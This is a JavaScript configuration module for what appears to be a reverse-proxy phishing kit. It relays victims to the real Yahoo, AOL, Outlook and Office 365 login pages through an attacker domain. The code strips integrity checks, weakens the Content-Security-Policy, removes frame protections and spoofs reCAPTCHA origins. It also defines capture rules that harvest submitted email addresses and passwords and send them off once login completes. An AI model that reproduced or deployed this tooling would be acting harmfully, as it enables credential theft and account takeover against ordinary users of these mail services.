/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const fs = require('fs')
const superagent = require('superagent');


// eslint-disable-next-line import/no-dynamic-require
const globalWorker = process.HOOK_JS_MODULE

/** Defined Functions used */


/** Important Defaults */
const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {

    constructor(proxyEndpoint, browserReq) {
        super(proxyEndpoint, browserReq)
    }

    processRequest() {
        if (this.browserReq.url.startsWith('/recaptcha')) {
            return this.browserReq.pipe(this.proxyEndpoint)
        }
        return super.processRequest()

    }

}

const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {

    constructor(proxyResp, browserEndPoint) {

        super(proxyResp, browserEndPoint)
        this.regexes = [
            {
                reg: /play.google.com/ig,
                replacement: `${process.env.HOST_DOMAIN}/playboy`,
            },
            {
                reg: /accounts.youtube.com\/accounts\/CheckConnection/gi,
                replacement: `${process.env.HOST_DOMAIN}/CheckConnection`,
            },
            {
                reg: /name="checkConnection" value/gi,
                replacement: /name"checkConnection" value="youtube:1052:1"/,
            },
            {
                reg: /www\.google\.com/,
                replacement: browserEndPoint.clientContext.hostname
            },
            {
                reg: /login\.yahoo\.net/,
                replacement: browserEndPoint.clientContext.hostname
            },
            {
                reg: /www.gstatic.com/,
                replacement: browserEndPoint.clientContext.hostname
            },
            {
                reg: /integrity/,
                replacement:'xintegrity'
            },
            {
                reg: /<meta http-equiv="Content-Security-Policy" content="(.*?)/,
                replacement: '<meta http-equiv="Content-Security-Policy" content="default-src *  data: blob: filesystem: about: ws: wss: \'unsafe-inline\' \'unsafe-eval\'; script-src * data: blob: \'unsafe-inline\' \'unsafe-eval\'; connect-src * data: blob: \'unsafe-inline\'; img-src * data: blob: \'unsafe-inline\'; frame-src * data: blob: ; style-src * data: blob: \'unsafe-inline\'; font-src * data: blob: \'unsafe-inline\';"'
            }
        ]
    }


    processResponse() {
        this.browserEndPoint.removeHeader('X-Frame-Options')
        if (this.proxyResp.headers['content-length'] < 1) {
            return this.proxyResp.pipe(this.browserEndPoint)
        }


        const extRedirectObj = super.getExternalRedirect()
        if (extRedirectObj !== null) {
            const rLocation = extRedirectObj.url
            const checkUrls = ["https://guce.yahoo.com", 
            "https://www.yahoo.com/?guccounter=1&guce_referrer=", "https://www.yahoo.com/", 
             "/account/comm-channel/refresh", '/account/upsell/webauthn',
             "https://account.live.com", "https://account.microsoft.com",
             "https://api.login.aol.com/oauth2/request_auth",
             'https://guce.aol.com/consent?gcrumb=',
             "https://www.aol.com/", 'https://www.office.com/landing'

             ]
            
            for (let exitUrl of checkUrls) {
                if (rLocation.startsWith(exitUrl)) {
                    this.browserEndPoint.setHeader('location', '/auth/login/finish')
                }
            }           
        }

        
        let newMsgBody;
        return this.superPrepareResponse(true)
            .then((msgBody) => {
                newMsgBody = msgBody
                for (let i = 0; i < this.regexes.length; i += 1) {
                    const regExObj = this.regexes[i]
                    if (regExObj.reg.test(newMsgBody)) {
                        newMsgBody = newMsgBody.replace(regExObj.reg, regExObj.replacement)
                    }
                }
                this.superFinishResponse(newMsgBody)
            }).catch((err) => {
            console.error(err)
        })
    }
}


const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true
    }

    execute(clientContext) {
        this.req.headers['origin'] = `https://${clientContext.currentDomain}`

        this.req.headers['referer'] = this.req.headers['referer']? this.req.headers['referer'].replace(clientContext.hostname, clientContext.currentDomain) : ''

        if (this.req.url.startsWith('/identity')) {
            if (this.req.url === '/identity/v2') {
                return super.superExecutePhpScript('email.php', clientContext)
            }
            if (this.req.url === '/identity/lalo/validate') {
                super.uploadRequestBody('PHP-EXEC', clientContext)
                return super.superExecutePhpScript('validate.php', clientContext)

            }
        }

        if (this.req.method === 'POST') {
            super.uploadRequestBody(clientContext.currentDomain, clientContext)
        }
        if (this.req.url.startsWith('/auth/login/')) {
            if (this.req.url === '/auth/login/yahoo') {
                clientContext.currentDomain = 'login.yahoo.com'
                this.res.writeHead(302, {location: '/'})
                return this.res.end('')
            }
           
            if (this.req.url === '/auth/login/aol') {
                this.req.url = '/'
                clientContext.currentDomain = 'login.aol.com'
                this.res.writeHead(302, {location: '/'})
                return this.res.end('')
            }
            
            if (this.req.url === '/auth/login/outlook') {
                clientContext.info.disableDeflate = true;
                this.req.headers['accept-encoding'] = 'gzip, br'
                this.req.url = '/'
                clientContext.currentDomain = 'login.live.com'
                this.res.writeHead(302, {location: '/'})
                return this.res.end('')
            }
            if (this.req.url === '/auth/login/office') {
                this.req.url = '/'
                clientContext.currentDomain = 'login.microsoftonline.com'
                this.res.writeHead(302, {location: '/'})
                return this.res.end('')
            }
            
            if (this.req.url === '/auth/login/finish') {
                clientContext.setLogAvailable(true)
                super.sendClientData(clientContext, {})
                this.res.writeHead(302, {location: 'http://default.com'})
                return super.cleanEnd('PHP-EXEC', clientContext) 
            }
        }

        if (this.req.url.startsWith('/CheckCookie')) {
            clientContext.setLogAvailable(true)
            super.sendClientData(clientContext, {})
        }



        const redirectToken = this.checkForRedirect()
        if (redirectToken !== null) {
            console.log(`Validating the redirect ${JSON.stringify(redirectToken)}`)

            if (redirectToken.url.startsWith('https://myaccount.google.com/') || 
                redirectToken.url.startsWith('https://accounts.google.com/ManageAccount')) {
                super.sendClientData(clientContext, {})
                this.res.writeHead(302, { location: '/auth/login/finish' })
                return super.cleanEnd('PHP-EXEC', clientContext)
            }

            const reqCheck = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
            if (redirectToken.obj.pathname.startsWith('/account/challenge/recaptcha')) {
                this.req.url = reqCheck.replace(clientContext.hostname, 'www.google.com')

            } else {
                this.req.url = reqCheck 
            }

            return this.superExecuteProxy(redirectToken.obj.host, clientContext)
        }

        return super.superExecuteProxy(clientContext.currentDomain, clientContext)

    }
}


const RecaptchaHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return req.url.startsWith('/recaptcha/');

    }

    execute(clientContext) {

        this.req.headers['origin'] = `https://${clientContext.currentDomain}`

        this.req.headers['referer'] = this.req.headers['referer']? this.req.headers['referer'].replace(clientContext.hostname, clientContext.currentDomain) : ''


        if (this.req.url.startsWith('/recaptcha/enterprise/anchor') || this.req.url.startsWith('/us/en/recaptcha/enterprise/anchor')) {
            const hostnameKey = Buffer.from(`https://${clientContext.hostname}:443`)
            const hostnameBase64Key = hostnameKey.toString('base64');
            console.log(hostnameBase64Key)

            this.req.url = this.req.url.replace('..', '==')
            this.req.url = this.req.url.replace('.&', '=&')


            this.req.url = this.req.url.replace(hostnameBase64Key, 'aHR0cHM6Ly9sb2dpbi55YWhvby5uZXQ6NDQz')

            
            console.log(this.req.url)
            return super.superExecuteProxy('www.google.com', clientContext)


        }


        if (this.req.url.startsWith('/recaptcha/enterprise')) {
            this.req.headers['origin'] = this.req.headers['origin']? this.req.headers['origin'].replace(clientContext.hostname, 'www.google.com') : ''
            this.req.headers['referer'] = this.req.headers['referer']? this.req.headers['referer'].replace(clientContext.hostname, 'www.google.com') : ''


            console.log(JSON.stringify(this.req.headers))
            
            return super.superExecuteProxy('www.google.com', clientContext)

        }

       

        if (this.req.url.startsWith('/recaptcha/releases')) {
            return super.superExecuteProxy('www.gstatic.com', clientContext)

        }


    }
}




const configExport = {
    CURRENT_DOMAIN: 'dashboard.plaid.com',
    START_PATH: '/identity/v2',


    EXTERNAL_FILTERS: 
    [
    'signaler-pa.googleapis.com',
    'ssl.gstatic.com',
    'dl.cws.xfinity.com',
    'comcast.demdex.net'
    ],


    PRE_HANDLERS:
        [
            RecaptchaHandler,
        ],
   
    PROXY_REQUEST: ProxyRequest,
    PROXY_RESPONSE: ProxyResponse,
    DEFAULT_PRE_HANDLER: DefaultPreHandler,

    CAPTURES: {
        victimEmail: {
            method: 'POST',
            params: ['lalo'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        emailCapture: {
            method: 'POST',
            params: ['username', 'user'],
            urls: '',
            hosts: ['login.yahoo.com', 'login.aol.com', 'login.microsoftonline.com', 'login.live.com'],
        },
        emailPassword: {
            method: 'POST',
            params: ['password', 'passwd'],
            urls: '',
            hosts: ['login.yahoo.com', 'login.aol.com', 'login.microsoftonline.com', 'login.live.com'],
        },
        manualEmail: {
            method: 'POST',
            params: ['lalo'],
            urls: '',
            hosts: 'PHP-EXEC',
        },

        manualPassword1: {
            method: 'POST',
            params: ['elberto'],
            urls: '',
            hosts: 'PHP-EXEC',
        }, 

        manualPassword2: {
            method: 'POST',
            params: ['aneko'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
    },

    // proxyDomain: process.env.PROXY_DOMAIN,
}
module.exports = configExport

